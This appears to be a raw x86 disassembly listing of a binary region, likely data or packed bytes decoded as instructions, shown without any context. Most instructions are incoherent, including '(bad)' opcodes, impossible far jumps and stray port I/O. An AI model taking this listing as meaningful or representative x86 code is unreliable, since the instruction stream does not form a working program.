  4189c1:	add    BYTE PTR [eax],al
  4189c3:	add    BYTE PTR [eax],al
  4189c5:	dec    eax
  4189c6:	das    
  4189c7:	sub    DWORD PTR [ecx],0xffffffc3
  4189ca:	or     BYTE PTR [ecx-0x405a36d1],cl
  4189d0:	push   ds
  4189d1:	mov    ah,0x2d
  4189d3:	mov    WORD PTR [ecx+esi*1+0x29],gs
  4189d7:	std    
  4189d8:	shl    DWORD PTR ds:0x2f88073e,0x83
  4189e0:	sub    DWORD PTR [eax-0x6f],esi
  4189e3:	shl    bl,0x35
  4189e6:	mov    cl,0x6
  4189e8:	fidiv  DWORD PTR [esi]
  4189ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4189eb:	xchg   BYTE PTR [ecx+eax*2+0x29],ch
  4189ef:	std    
  4189f0:	push   cs
  4189f1:	cs sbb al,0xff
  4189f4:	call   0x23c5036f
  4189f9:	pop    esp
  4189fa:	das    
  4189fb:	std    
  4189fc:	popa   
  4189fd:	jno    0x4189c1
  4189ff:	inc    esi
  418a00:	je     0x418a4e
  418a02:	call   0x648c:0x2db95f6f
  418a09:	cs sub ebp,edi
  418a0c:	(bad)  
  418a0d:	inc    esi
  418a0e:	cs adc edi,ebp
  418a11:	xchg   edx,eax
  418a13:	jmp    FWORD PTR [ecx+0x3b]
  418a16:	xor    eax,0x9b441afd
  418a1b:	add    BYTE PTR [edx],bl
  418a1d:	pop    ds
  418a1e:	sub    al,0x65
  418a20:	jmp    0x74c18c9b
  418a25:	ret    
  418a26:	cmp    bh,bl
  418a28:	sahf   
  418a29:	add    BYTE PTR [eax],al
  418a2b:	add    BYTE PTR [eax],al
  418a2d:	add    BYTE PTR [ecx+0x6d2cc4d2],al
  418a33:	sub    al,0xff
  418a35:	call   0x54b9b0
  418a3a:	sbb    al,0x13
  418a3c:	inc    eax
  418a3d:	add    BYTE PTR [edi-0x7401810f],ah
  418a43:	pop    ebp
  418a44:	and    al,0x53
  418a46:	test   eax,0x9b50f96c
  418a4b:	pop    esp
  418a4c:	stc    
  418a4d:	lea    edx,[ecx+0x4bfff8b9]
  418a53:	push   ecx
  418a54:	push   ebx
  418a55:	jmp    ecx
  418a57:	jo     0x418a67
  418a59:	inc    eax
  418a5a:	int3   
  418a5b:	stos   DWORD PTR es:[edi],eax
  418a5c:	mov    edi,0x4179d274
  418a61:	cld    
  418a62:	push   ebp
  418a63:	ins    BYTE PTR es:[edi],dx
  418a64:	cmc    
  418a65:	push   esi
  418a66:	fwait
  418a67:	cld    
  418a68:	or     edx,DWORD PTR [ebx]
  418a6a:	or     al,0x1
  418a6c:	xchg   DWORD PTR [ebp-0x6c],eax
  418a6f:	cmp    al,0xff
  418a72:	adc    BYTE PTR ds:0x30001a5,ch
  418a78:	das    
  418a79:	sar    BYTE PTR [ebp-0x27],0x2e
  418a7d:	leave  
  418a7e:	bnd ja 0x418a0d
  418a81:	inc    ebp
  418a82:	push   esp
  418a83:	hlt    
  418a84:	cli    
  418a85:	jmp    FWORD PTR [ecx]
  418a87:	lods   al,BYTE PTR ds:[esi]
  418a88:	(bad)  
  418a89:	std    
  418a8a:	fwait
  418a8b:	lock out 0x9c,eax
  418a8e:	mov    dl,0xf0
  418a90:	cli    
  418a91:	lea    eax,[eax]
  418a93:	add    BYTE PTR [eax],al
  418a95:	add    BYTE PTR [eax],al
  418a97:	loope  0x418a87
  418a99:	clc    
  418a9a:	(bad)  
  418a9b:	cmp    ecx,DWORD PTR [edi]
  418a9d:	mov    WORD PTR [ebx+edi*1-0x10],ss
  418aa1:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  418aa3:	sub    al,0x44
  418aa5:	std    
  418aa6:	mov    BYTE PTR [ecx],ch
  418aa8:	(bad)  
  418aa9:	fiadd  DWORD PTR [ebx+0x5c]
  418aac:	scas   eax,DWORD PTR es:[edi]
  418aad:	sbb    BYTE PTR [esp+ebp*8+0x3fefd43],bh
  418ab4:	cmpxchg DWORD PTR [ebp+esi*2+0x45683194],ecx
  418abc:	or     esp,eax
  418abe:	jmp    DWORD PTR [ebx]
  418ac0:	dec    edi
  418ac1:	inc    ebp
  418ac2:	adc    dh,BYTE PTR [ebp-0x763f11e7]
  418ac8:	and    bh,BYTE PTR [esi-0x8]
  418acb:	sbb    eax,0x75000b30
  418ad0:	rol    BYTE PTR ds:0x44e03532,1
  418ad6:	je     0x418b52
  418ad8:	cwde   
  418ad9:	(bad)  
  418ada:	xlat   BYTE PTR ds:[ebx]
  418adb:	rcr    DWORD PTR [eax+0x1],1
  418ade:	(bad)  
  418adf:	fisubr DWORD PTR [edi]
  418ae1:	or     DWORD PTR [eax],eax
  418ae3:	jne    0x418a71
  418ae5:	iret   
  418ae6:	scas   eax,DWORD PTR es:[edi]
  418ae7:	je     0x418a79
  418ae9:	cmp    al,0xc1
  418aeb:	and    BYTE PTR [eax-0x1e267ee1],ah
  418af1:	sub    ah,0xc1
  418af4:	and    eax,DWORD PTR [ecx]
  418af6:	add    BYTE PTR [esi+0x6b],al
  418af9:	fimul  DWORD PTR [eax+0x0]
  418aff:	add    BYTE PTR [eax],ch
  418b01:	and    esi,esi
  418b03:	fdiv   st,st(6)
  418b05:	cld    
  418b06:	add    al,BYTE PTR [edi+0x41556d78]
  418b0c:	jne    0x418abc
  418b0e:	push   es
  418b0f:	xchg   DWORD PTR [eax-0x6f],ebp
  418b12:	inc    eax
  418b13:	inc    ecx
  418b14:	jne    0x418b3a
  418b16:	mov    eax,0x2d148d07
  418b1b:	std    
  418b1c:	jb     0x418abb
  418b1e:	inc    eax
  418b1f:	jae    0x418b93
  418b21:	pop    es
  418b22:	inc    esp
  418b23:	out    0xa3,eax
  418b25:	sbb    al,BYTE PTR [ecx]
  418b27:	add    dh,al
  418b29:	rol    DWORD PTR [ebx],1
  418b2b:	add    BYTE PTR [ebp+0x19],bh
  418b2e:	(bad)  
  418b2f:	cld    
  418b30:	pusha  
  418b31:	popa   
  418b32:	adc    eax,DWORD PTR [eax+0x75]
  418b35:	add    cl,BYTE PTR [edx+0x33]
  418b38:	das    
  418b39:	mov    edi,0xb535eee6
  418b3e:	stc    
  418b3f:	xor    al,BYTE PTR [esi+0x22c3f93e]
  418b45:	pusha  
  418b46:	ja     0x418b85
  418b48:	mov    ah,0x2
  418b4a:	outs   dx,DWORD PTR ds:[esi]
  418b4b:	adc    BYTE PTR [ecx],cl
  418b4d:	cmp    BYTE PTR [edx],ch
  418b4f:	add    al,0x1c
  418b51:	add    esp,DWORD PTR [ebp-0x55c7f6f8]
  418b57:	add    edi,edx
  418b59:	cwde   
  418b5a:	jmp    0x4203:0xaa555d6b
  418b61:	jp     0x418b52
  418b63:	xchg   BYTE PTR [eax],al
  418b65:	add    BYTE PTR [eax],al
  418b67:	add    BYTE PTR [eax],al
  418b69:	mov    ch,0xf9
  418b6b:	scas   eax,DWORD PTR es:[edi]
  418b6c:	mov    eax,0xff476e2
  418b71:	fs ret 0x9be6
  418b75:	mov    dl,0x54
  418b77:	stos   BYTE PTR es:[edi],al
  418b78:	add    eax,eax
  418b7a:	push   ebx
  418b7b:	pop    DWORD PTR [ebx-0x2f]
  418b7e:	mov    esi,0x7ccb32e6
  418b83:	stos   DWORD PTR es:[edi],eax
  418b84:	out    0x7a,eax
  418b86:	sar    BYTE PTR [esi+0x5],cl
  418b89:	ja     0x418b8d
  418b8b:	out    0x7c,eax
  418b8d:	jle    0x418bd9
  418b8f:	add    eax,esi
  418b91:	xchg   edx,eax
  418b92:	sub    ebx,esp
  418b94:	pop    es
  418b95:	arpl   dx,ax
  418b97:	out    0x7e,al
  418b99:	ss cli 
  418b9b:	into   
  418b9c:	sub    BYTE PTR [edx+ebp*1-0x22],bh
  418ba0:	mov    BYTE PTR ds:0x6ded69af,dh
  418ba6:	mov    al,0x9
  418ba8:	aad    0xc5
  418baa:	pushf  
  418bab:	out    0x9b,eax
  418bad:	jmp    0x10:0x50042a37
  418bb4:	mov    ch,0x61
  418bb6:	ret    0x69ff
  418bb9:	inc    edx
  418bba:	repnz shr DWORD PTR [edx],cl
  418bbd:	jno    0x418be6
  418bbf:	mov    eax,ds:0xffc3cad5
  418bc4:	shl    DWORD PTR [ecx+0x642d83f7],1
  418bca:	daa    
  418bcb:	std    
  418bcc:	xchg   ecx,eax
  418bcd:	add    BYTE PTR [eax],al
  418bcf:	add    BYTE PTR [eax],al
  418bd1:	add    BYTE PTR [edx],bh
  418bd3:	cs std 
  418bd5:	jle    0x418bd4
  418bd7:	inc    edx
  418bd8:	or     eax,0xfd27346d
  418bdd:	outs   dx,BYTE PTR ds:[esi]
  418bde:	inc    esp
  418bdf:	mov    ch,0x7
  418be1:	push   ecx
  418be2:	and    eax,0xfd5efd2e
  418be7:	inc    edx
  418be8:	or     eax,0xfd26e46d
  418bed:	dec    esi
  418bee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418bef:	adc    eax,0x29b6d834
  418bf4:	mov    ds:0xffc3262d,al
  418bf9:	icebp  
  418bfa:	cdq    
  418bfb:	mov    ch,0x4e
  418bfd:	bound  ebp,QWORD PTR [edx-0x6a]
  418c00:	retf   0x76aa
  418c03:	sbb    cl,BYTE PTR [eax+0x39276595]
  418c09:	sub    dh,BYTE PTR [esi+edi*2+0x1b]
  418c0d:	push   cs
  418c0e:	fs daa 
  418c10:	sub    esp,ebp
  418c12:	cli    
  418c13:	cmp    al,0x41
  418c15:	jmp    0xab157e33
  418c1a:	jbe    0x418c07
  418c1c:	clc    
  418c1d:	je     0x418bb4
  418c1f:	jl     0x418bdd
  418c21:	or     eax,0xe9fd2911
  418c26:	mov    ds,WORD PTR [ecx+eax*1]
  418c29:	jmp    0x65cc5fa4
  418c2e:	pop    edx
  418c2f:	add    BYTE PTR [ebx],0x0
  418c32:	dec    esp
  418c33:	add    eax,0xff50
  418c38:	add    BYTE PTR [eax],al
  418c3a:	add    BYTE PTR [ecx+0x61],cl
  418c3d:	retf   0x5c43
  418c40:	pushf  
  418c41:	(bad)  
  418c43:	(bad)  
  418c44:	(bad)  
  418c45:	addr16 sar ch,1
  418c48:	cmp    eax,0x8e2eb7fd
  418c4d:	pop    DWORD PTR [esp+esi*8+0xc00e684]
  418c54:	bnd jo 0x418c5f
  418c57:	add    al,0x68
  418c59:	stc    
  418c5a:	call   DWORD PTR [ebx-0x67f03f7f]
  418c60:	ret    0xfffd
  418c63:	xchg   ebx,eax
  418c64:	jmp    0x418ca6
  418c66:	or     BYTE PTR [esi],cl
  418c68:	jno    0x418c6e
  418c6a:	call   0x3c65bd
  418c6f:	aaa    
  418c70:	jmp    FWORD PTR [edi+0xabf8601]
  418c76:	xchg   ebp,eax
  418c77:	mov    WORD PTR [edx+0x5b],ss
  418c7a:	pop    ebx
  418c7b:	inc    edi
  418c7c:	loopne 0x418cd6
  418c7e:	ret    0x4d8
  418c81:	push   ecx
  418c82:	mov    eax,DWORD PTR [eax-0x3443137c]
  418c88:	add    al,0x0
  418c8a:	push   esi
  418c8b:	jmp    0x418c34
  418c8d:	mov    eax,0xfaf28444
  418c92:	call   0x418aaf
  418c97:	and    DWORD PTR [eax-0x276c025b],esi
  418c9d:	out    0xcb,eax
  418c9f:	add    BYTE PTR [eax],al
  418ca1:	add    BYTE PTR [eax],al
  418ca3:	add    BYTE PTR [eax-0xe],ah
  418ca6:	cli    
  418ca7:	mov    ecx,DWORD PTR [ebx+ebx*8]
  418caa:	cld    
  418cab:	dec    DWORD PTR [edx+ecx*4+0x45e18cff]
  418cb2:	stc    
  418cb3:	push   DWORD PTR [ebp+0x50]
  418cb6:	sar    esp,cl
  418cb8:	call   0x18d0cde
  418cbd:	rcl    BYTE PTR [ebx-0x31],cl
  418cc0:	mov    dh,0x19
  418cc2:	sbb    DWORD PTR [ecx],edx
  418cc4:	push   ebx
  418cc5:	sbb    al,BYTE PTR [ecx]
  418cc7:	mov    bh,0x53
  418cc9:	sbb    eax,DWORD PTR [ecx]
  418ccb:	add    dh,ch
  418ccd:	push   edi
  418cce:	inc    esi
  418ccf:	add    BYTE PTR [ebp-0x27],dh
  418cd2:	mov    edx,0xc69f2c72
  418cd7:	xchg   ebx,eax
  418cd8:	lds    eax,FWORD PTR [ebx]
  418cda:	add    ebp,DWORD PTR [eax+0x5]
  418cdd:	outs   dx,DWORD PTR ds:[esi]
  418cde:	sar    edi,0x13
  418ce1:	dec    edi
  418ce2:	adc    dh,BYTE PTR gs:[ebp-0x70f85e7]
  418ce9:	scas   eax,DWORD PTR es:[edi]
  418cea:	mov    bh,0x15
  418cec:	cli    
  418ced:	add    DWORD PTR es:[ecx],edx
  418cf0:	xor    eax,0x75b4f019
  418cf5:	sbb    DWORD PTR [ecx],eax
  418cf7:	jae    0x418d65
  418cf9:	outs   dx,DWORD PTR ds:[esi]
  418cfa:	adc    ebp,DWORD PTR cs:[ecx+0x4c]
  418cfe:	sar    edi,0x87
  418d01:	out    dx,eax
  418d02:	int3   
  418d03:	mov    BYTE PTR [ebx+0xc23c8f],dh
  418d09:	add    BYTE PTR [eax],al
  418d0b:	add    BYTE PTR [eax],al
  418d0d:	jns    0x418d28
  418d0f:	fmul   DWORD PTR [eax-0x7d86337]
  418d15:	hlt    
  418d16:	cmc    
  418d17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d18:	add    dh,BYTE PTR [ebp+0x19]
  418d1b:	(bad)  
  418d1c:	mov    ah,BYTE PTR [ecx]
  418d1e:	cmp    eax,0x1c74e7f9
  418d23:	add    DWORD PTR [eax],eax
  418d25:	xchg   edx,eax
  418d26:	scas   al,BYTE PTR es:[edi]
  418d27:	adc    BYTE PTR [ecx-0x7b7fe2c8],cl
  418d2d:	pop    ecx
  418d2e:	sub    al,BYTE PTR [edx]
  418d30:	add    BYTE PTR [ebp+0x2],dh
  418d33:	aaa    
  418d34:	das    
  418d35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d36:	sahf   
  418d37:	stos   DWORD PTR es:[edi],eax
  418d38:	ret    0x7c6a
  418d3b:	sub    al,0xfc
  418d3d:	ficom  DWORD PTR [edx-0x48]
  418d40:	ret    0x1f5a
  418d43:	pusha  
  418d44:	sub    BYTE PTR [ebp+0x2],dh
  418d47:	push   ds
  418d48:	jnp    0x418da0
  418d4a:	lds    ebp,FWORD PTR [eax+0x61ce42ff]
  418d50:	pop    ds
  418d51:	hlt    
  418d52:	adc    eax,0xad31d60f
  418d57:	jmp    0xa62f:0x378ab680
  418d5e:	cli    
  418d5f:	jle    0x418dc0
  418d61:	sbb    BYTE PTR [edi],ah
  418d63:	xchg   BYTE PTR [eax-0x65e8754a],al
  418d69:	or     bl,BYTE PTR [edi+0x2b44056]
  418d6f:	outs   dx,BYTE PTR ds:[esi]
  418d70:	sbb    BYTE PTR [eax],al
  418d72:	add    BYTE PTR [eax],al
  418d74:	add    BYTE PTR [eax],al
  418d76:	rcl    DWORD PTR [ebx],1
  418d78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d79:	add    edi,esp
  418d7b:	xor    DWORD PTR [ebp+esi*1+0x61],esp
  418d7f:	or     eax,ecx
  418d81:	cs dec ebx
  418d83:	daa    
  418d84:	hlt    
  418d85:	jecxz  0x418d0c
  418d87:	ret    0x88e6
  418d8a:	mov    ch,0xad
  418d8c:	shl    eax,cl
  418d8e:	dec    edx
  418d8f:	add    ah,bh
  418d91:	add    ecx,DWORD PTR [ecx-0x8]
  418d94:	xchg   esp,eax
  418d95:	cs data16 idiv cl
  418d99:	ret    
  418d9a:	mov    dl,0xf3
  418d9c:	es int 0xb3
  418d9f:	inc    ebx
  418da0:	fild   WORD PTR [ebx]
  418da2:	in     al,dx
  418da3:	aas    
  418da4:	add    dh,BYTE PTR [esi]
  418da6:	inc    esi
  418da7:	jnp    0x418dbc
  418da9:	aam    0x43
  418dab:	jnp    0x418d99
  418dad:	lahf   
  418dae:	mov    edi,0xa7e8ffc2
  418db3:	int    0xe7
  418db5:	rol    dl,0x25
  418db8:	std    
  418db9:	sbb    bh,BYTE PTR [ebp+edi*2+0x435ce143]
  418dc0:	jae    0x418db0
  418dc2:	gs out 0xa4,ax
  418dc6:	jno    0x418dca
  418dc8:	add    BYTE PTR [ebx+0x77],dl
  418dcb:	rcl    DWORD PTR [eax+0x6c],cl
  418dce:	xor    bh,dh
  418dd0:	dec    edi
  418dd1:	push   ds
  418dd2:	nop
  418dd3:	mov    cl,0x7
  418dd5:	popa   
  418dd6:	sub    ah,BYTE PTR [edi]
  418dd8:	push   0xffffffa6
  418dda:	add    BYTE PTR [eax],al
  418ddc:	add    BYTE PTR [eax],al
  418dde:	add    BYTE PTR [eax+0x11],ah
  418de1:	clc    
  418de2:	sti    
  418de3:	ss test BYTE PTR es:[ecx+0x24c601ea],ch
  418deb:	dec    eax
  418dec:	and    eax,0xc35221a0
  418df1:	jmp    FWORD PTR [ecx+0x51]
  418df4:	push   cs
  418df5:	pop    es
  418df6:	sub    al,0x75
  418df8:	int3   
  418df9:	mov    BYTE PTR [edx+edi*4-0x3a16bfed],dh
  418e00:	ins    DWORD PTR es:[edi],dx
  418e01:	pop    eax
  418e02:	sub    al,0xb4
  418e04:	and    eax,0x3902ec2a
  418e09:	inc    ecx
  418e0a:	jmp    0xac42900b
  418e0f:	sahf   
  418e10:	jns    0x418e5d
  418e12:	in     eax,dx
  418e13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e14:	mov    ch,0x54
  418e16:	sub    eax,DWORD PTR ss:[ecx+0x2475b4c0]
  418e1d:	inc    ebx
  418e1e:	les    ebp,FWORD PTR es:[ebp+0x6c]
  418e22:	sub    al,0xb4
  418e24:	and    eax,0x3902ec2a
  418e29:	inc    ecx
  418e2a:	jmp    0x42902b
  418e2f:	loope  0x418e0a
  418e31:	mov    BYTE PTR [ebp+0x74],cl
  418e34:	push   ecx
  418e35:	dec    ebp
  418e36:	push   edi
  418e37:	mov    ecx,edi
  418e39:	pop    ebp
  418e3a:	test   DWORD PTR [ebp+ebp*2+0x0],ecx
  418e3e:	(bad)  
  418e3f:	mov    eax,ds:0x35fad7
  418e44:	add    BYTE PTR [eax],al
  418e46:	add    BYTE PTR [eax],al
  418e48:	or     dl,0x3e
  418e4b:	add    BYTE PTR [ebp*1-0x29b3bc2f],al
  418e52:	jo     0x418e4c
  418e54:	jae    0x418e5c
  418e56:	nop
  418e57:	test   DWORD PTR [ebx],0x81c083d6
  418e5d:	add    edi,esi
  418e5f:	inc    ebp
  418e60:	or     edx,esi
  418e62:	xor    BYTE PTR [eax],bh
  418e64:	lock inc ecx
  418e66:	std    
  418e67:	mov    bh,0x14
  418e69:	int    0x3e
  418e6b:	add    BYTE PTR [ebx],cl
  418e6d:	ins    BYTE PTR es:[edi],dx
  418e6e:	cmc    
  418e6f:	push   edi
  418e70:	hlt    
  418e71:	imul   esi,esp,0xffffffff
  418e74:	sti    
  418e75:	jl     0x418e37
  418e77:	jne    0x418e98
  418e79:	xlat   BYTE PTR ds:[ebx]
  418e7a:	inc    eax
  418e7b:	inc    esp
  418e7d:	xor    edi,esp
  418e7f:	je     0x418ea2
  418e81:	mov    ebp,edi
  418e83:	jg     0x418e61
  418e85:	add    BYTE PTR [edi-0x1],cl
  418e88:	rcr    eax,0x52
  418e8b:	jmp    ecx
  418e8d:	lods   al,BYTE PTR ds:[esi]
  418e8e:	adc    DWORD PTR [eax-0x34],eax
  418e91:	pop    es
  418e92:	xor    edi,edi
  418e94:	cmp    edx,esi
  418e96:	xchg   BYTE PTR [ebp+0x34],al
  418e99:	cmp    al,dh
  418e9b:	ret    0xd4
  418e9e:	push   0x0
  418ea0:	mov    ebp,DWORD PTR [ecx+esi*1]
  418ea3:	aam    0xdf
  418ea5:	add    bl,bh
  418ea7:	adc    eax,0x4011bc
  418eac:	add    BYTE PTR [eax],al
  418eae:	add    BYTE PTR [eax],al
  418eb0:	add    BYTE PTR [ebp+0x4],dh
  418eb3:	dec    ecx
  418eb4:	sbb    DWORD PTR [ebp+0x28c1490b],esi
  418eba:	scas   al,BYTE PTR es:[edi]
  418ebb:	pushf  
  418ebc:	and    edi,ecx
  418ebe:	cdq    
  418ebf:	sbb    al,0x4
  418ec1:	ja     0x418ede
  418ec3:	add    DWORD PTR [esi-0x18],edx
  418ec6:	pop    ebp
  418ec7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ec8:	dec    edi
  418ec9:	add    bh,dl
  418ecb:	sbb    edx,DWORD PTR [eax+0x32]
  418ece:	fistp  WORD PTR [edi+0x1197527]
  418ed4:	std    
  418ed5:	cmp    cl,0x12
  418ed8:	inc    eax
  418ed9:	jne    0x418e71
  418edb:	inc    ebx
  418edc:	jae    0x418f56
  418ede:	xchg   esi,eax
  418edf:	scas   al,BYTE PTR es:[edi]
  418ee0:	out    0xfd,eax
  418ee2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ee3:	add    eax,DWORD PTR [eax]
  418ee5:	jne    0x418f28
  418ee7:	sub    al,BYTE PTR [esi]
  418ee9:	je     0x418f04
  418eeb:	jle    0x418f20
  418eed:	mov    ch,0x2b
  418eef:	sar    edi,0xc7
  418ef2:	in     al,0x6c
  418ef4:	sbb    al,0x74
  418ef6:	sbb    DWORD PTR [ecx],eax
  418ef8:	push   ecx
  418ef9:	inc    esi
  418efa:	jl     0x418f73
  418efc:	add    DWORD PTR [ebp-0x5502d75d],0x9
  418f03:	sub    esi,edx
  418f05:	neg    BYTE PTR [ebp-0x8]
  418f08:	mov    bh,al
  418f0a:	dec    ecx
  418f0b:	daa    
  418f0c:	std    
  418f0d:	jmp    0x28cb:0x659b7c69
  418f14:	std    
  418f15:	add    BYTE PTR [eax],al
  418f17:	add    BYTE PTR [eax],al
  418f19:	add    dl,bl
  418f1b:	fisttp QWORD PTR cs:[esi]
  418f1e:	xor    eax,0x40c08019
  418f23:	xor    dl,dh
  418f25:	mov    bh,al
  418f27:	imul   esp,DWORD PTR [edi],0xfcc0bafd
  418f2d:	addr16 jne 0x418f32
  418f30:	call   0x64b70438
  418f35:	and    BYTE PTR [ebx+0x2ad31623],0x23
  418f3c:	xor    eax,0x73f6b987
  418f41:	mov    cl,0xfe
  418f43:	push   0x37
  418f45:	add    al,0x75
  418f47:	add    bh,bh
  418f49:	gs jae 0x418f4d
  418f4c:	out    0x78,eax
  418f4e:	out    0xc2,al
  418f50:	sahf   
  418f51:	je     0x418fc8
  418f53:	add    ah,bh
  418f55:	sbb    eax,DWORD PTR [esi]
  418f57:	cld    
  418f58:	out    0x3,eax
  418f5a:	in     al,dx
  418f5b:	cmp    esi,DWORD PTR [edi]
  418f5d:	jns    0x418f15
  418f5f:	jbe    0x418f78
  418f61:	imul   esi,DWORD PTR [edi+0x2],0xffffffe7
  418f65:	sub    esp,0x3a
  418f68:	mov    edi,0xe7026d9f
  418f6d:	jl     0x418f25
  418f6f:	(bad)  
  418f70:	jae    0x418f22
  418f72:	bound  ebp,QWORD PTR [edx+0x59]
  418f75:	add    esi,DWORD PTR [ebp+0x2]
  418f78:	jg     0x418f2f
  418f7a:	jo     0x418f7d
  418f7c:	out    0x78,eax
  418f7e:	add    BYTE PTR [eax],al
  418f80:	add    BYTE PTR [eax],al
  418f82:	add    BYTE PTR [esi+0xb9e16b2],dh
  418f88:	lock je 0x418f5c
  418f8b:	out    dx,eax
  418f8c:	mov    esp,0x79a1d362
  418f91:	hlt    
  418f92:	xchg   edi,eax
  418f93:	sti    
  418f94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f95:	(bad)  
  418f96:	jl     0x418ffe
  418f98:	call   0x3a7:0x1299105d
  418f9f:	test   BYTE PTR [ecx-0x2c],0x16
  418fa3:	(bad)  
  418fa4:	mov    esp,0x7520d3ce
  418fa9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418faa:	jmp    0x418fde
  418fac:	jne    0x418fae
  418fae:	mov    ah,0x6
  418fb0:	sbb    edi,esp
  418fb2:	loop   0x41902a
  418fb4:	add    ch,cl
  418fb6:	jmp    0x254e:0x6afd39f3
  418fbd:	je     0x418fb1
  418fbf:	mov    edi,DWORD PTR [esi+esi*2]
  418fc2:	mul    BYTE PTR [esi+0xd917325]
  418fc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418fc9:	imul   edx,DWORD PTR [ebx+0x45e7ca78],0xffffff83
  418fd0:	and    edi,ebp
  418fd2:	out    dx,al
  418fd3:	and    ch,BYTE PTR [edx+0x1f54f3e7]
  418fd9:	std    
  418fda:	jb     0x418ffe
  418fdc:	scas   al,BYTE PTR es:[edi]
  418fdd:	xchg   BYTE PTR [ecx+edx*1],ch
  418fe0:	lea    esi,[ebx+0x29]
  418fe3:	loope  0x419038
  418fe5:	add    cl,ch
  418fe7:	add    BYTE PTR [eax],al
  418fe9:	add    BYTE PTR [eax],al
  418feb:	add    BYTE PTR [esi+0x2a],dh
  418fee:	or     bh,ah
  418ff0:	ja     0x418ff4
  418ff2:	push   ecx
  418ff3:	fs mov edx,0x5caefd92
  418ff9:	mov    dl,0x69
  418ffb:	jmp    0x418fa0
  418ffd:	popf   
  418ffe:	outs   dx,DWORD PTR ds:[esi]
  418fff:	inc    ecx
  419000:	and    DWORD PTR [eax-0x538917d0],0xbdd25c07
  41900a:	dec    edi
  41900b:	adc    esi,DWORD PTR [ebx-0x73]
  41900e:	jnp    0x41901d
  419010:	xor    DWORD PTR [edx],ebp
  419012:	imul   edi,DWORD PTR [edx-0xb02fd89],0xa
  419019:	lea    eax,[ebx+0x51]
  41901c:	pushf  
  41901d:	xchg   ebp,eax
  41901e:	outs   dx,DWORD PTR ds:[esi]
  41901f:	mov    ecx,0xdc894861
  419024:	adc    dl,dl
  419026:	imul   ecx,DWORD PTR ds:0xfe8ac0,0xff361b24
  419030:	add    DWORD PTR [edi-0x631cef3c],0x40
  419037:	fs pop es
  419039:	xchg   eax,edi
  41903b:	add    ecx,edx
  41903d:	pop    ds
  41903e:	mov    ch,0xb4
  419040:	mov    WORD PTR ds:0x213fe800,es
  419046:	(bad)  
  419047:	jmp    edx
  419049:	xchg   cl,al
  41904b:	je     0x419092
  41904d:	enter  0x3,0x0
  419051:	add    BYTE PTR [eax],al
  419053:	add    BYTE PTR [eax],al
  419055:	jmp    0x5605:0x8c055fab
  41905c:	push   0x3d7b1c
  419061:	stos   DWORD PTR es:[edi],eax
  419062:	jmp    0x419074
  419064:	cmp    al,0x6a
  419066:	inc    ebp
  419067:	std    
  419068:	mov    dl,BYTE PTR [ecx+0x15]
  41906b:	rol    DWORD PTR [ebx+0x5c],1
  41906e:	push   es
  41906f:	or     DWORD PTR [ecx+eax*1+0x46],ebp
  419073:	std    
  419074:	sbb    BYTE PTR [eax],0x19
  419077:	mov    bh,al
  419079:	ja     0x419056
  41907b:	mov    DWORD PTR [ebx*1+0x62400d15],edx
  419082:	jno    0x419078
  419084:	pop    esi
  419085:	iret   
  419086:	dec    edi
  419087:	mov    ah,ch
  419089:	(bad)  
  41908a:	stc    
  41908b:	lsl    ebx,WORD PTR [eax*1+0x217c684f]
  419093:	std    
  419094:	jmp    DWORD PTR [esi+eax*2+0x6b]
  419098:	inc    eax
  419099:	or     al,0x98
  41909b:	xor    ah,0x62
  41909e:	jmp    0xfffc:0xf6dce8fa
  4190a5:	sbb    ecx,DWORD PTR [di-0x75]
  4190a9:	jne    0x419119
  4190ab:	stc    
  4190ac:	out    0x76,eax
  4190ae:	mov    ebp,0x30b2fd27
  4190b3:	add    DWORD PTR [edx],eax
  4190b5:	jne    0x4190e2
  4190b7:	jle    0x419079
  4190b9:	add    BYTE PTR [eax],al
  4190bb:	add    BYTE PTR [eax],al
  4190bd:	add    BYTE PTR [ecx+0xf],al
  4190c0:	jne    0x41904d
  4190c2:	test   eax,0x44fd27f0
  4190c7:	popa   
  4190c8:	ror    DWORD PTR [edx-0x2db0900],1
  4190ce:	call   0x7d0f:0x92f04402
  4190d5:	rol    BYTE PTR [ecx],0x17
  4190d8:	sub    BYTE PTR [esi],dh
  4190da:	out    dx,al
  4190db:	jmp    0x4190ad
  4190dd:	out    0xf4,eax
  4190df:	dec    ebp
  4190e0:	sub    ch,bh
  4190e2:	pop    esi
  4190e3:	sub    al,0xf4
  4190e5:	mov    edi,0x44252ce
  4190ea:	jne    0x4190c2
  4190ec:	js     0x4190da
  4190ee:	hlt    
  4190ef:	inc    ebp
  4190f0:	in     al,dx
  4190f1:	(bad)  
  4190f2:	push   edx
  4190f3:	sub    dl,dl
  4190f5:	push   ebp
  4190f6:	mov    ds:0x42ff1084,al
  4190fb:	sub    dl,dl
  4190fd:	mov    BYTE PTR ds:0xb5692bc2,bh
  419103:	sub    DWORD PTR [eax-0x7d],edi
  419106:	cmp    DWORD PTR [eax+0x25],ebp
  419109:	std    
  41910a:	lds    ebp,FWORD PTR [eax-0x41]
  41910d:	test   DWORD PTR [ebx+0x28],0x141d373f
  419114:	loopne 0x419112
  419116:	or     bl,BYTE PTR [ebp+0x2b]
  419119:	xor    DWORD PTR ds:0xfd02b794,esi
  41911f:	pop    ecx
  419120:	jne    0x419155
  419122:	add    BYTE PTR [eax],al
  419124:	add    BYTE PTR [eax],al
  419126:	add    cl,al
  419128:	scas   eax,DWORD PTR es:[edi]
  419129:	and    al,0xfd
  41912b:	xor    eax,0x792c6a02
  419130:	xchg   ebp,eax
  419131:	call   0x120aac28
  419136:	xor    eax,DWORD PTR [edi+0x2a]
  419139:	sbb    al,BYTE PTR [ebp+esi*1-0x73]
  41913d:	mov    esp,0xf735cd1b
  419142:	add    al,0x75
  419144:	or     esp,0x2f
  419147:	jne    0x4190d6
  419149:	cmp    BYTE PTR fs:[ebx-0x122bd9e1],ch
